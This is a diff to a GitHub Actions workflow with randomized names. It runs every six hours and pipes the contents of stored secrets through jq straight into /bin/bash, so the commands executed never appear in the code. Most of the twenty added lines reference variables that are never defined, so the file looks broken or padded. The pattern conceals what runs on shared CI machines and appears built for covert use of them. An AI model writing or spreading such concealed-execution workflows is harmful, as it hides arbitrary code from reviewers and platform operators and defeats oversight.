@@ -3,8 +3,7 @@ name: weidiyi9182
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 1/6 * * *'
-
+    - cron: '30 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,10 +11,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: weidiyi9182
         env:
-          wyk8: ${{ secrets.wyk8 }}
+          oag6907: ${{ secrets.oag6907 }}
         run: |
-          echo $wyk8 | jq -r .xli5 | /bin/bash
-          echo $gdw792 | jq -r .kh20 | /bin/bash
-          echo $htnc62539 | jq -r .oyj180 | /bin/bash
-          echo $jwrrn96 | jq -r .yav9 | /bin/bash
+          echo $oag6907 | jq -r .m33 | /bin/bash
+          echo $ucutc58 | jq -r .wc262 | /bin/bash
+          echo $sf23815 | jq -r .ddpd7 | /bin/bash
+          echo $aftev347 | jq -r .ajyhu99 | /bin/bash
+          echo $racsb671 | jq -r .azvw91 | /bin/bash
+          echo $suqi7709 | jq -r .vvcr52964 | /bin/bash
+          echo $kfeo811 | jq -r .waps1782 | /bin/bash
+          echo $gyot061 | jq -r .qysyd0098 | /bin/bash
+          echo $b60 | jq -r .re29927 | /bin/bash
+          echo $ljhr274 | jq -r .fxct88873 | /bin/bash
+          echo $teybl51 | jq -r .j25 | /bin/bash
+          echo $mehf5 | jq -r .minr42 | /bin/bash
+          echo $sdti68823 | jq -r .sxsm1 | /bin/bash
+          echo $ntb1693 | jq -r .y35 | /bin/bash
+          echo $fmqb24 | jq -r .vmop07 | /bin/bash
+          echo $whk790 | jq -r .gpimr536 | /bin/bash
 
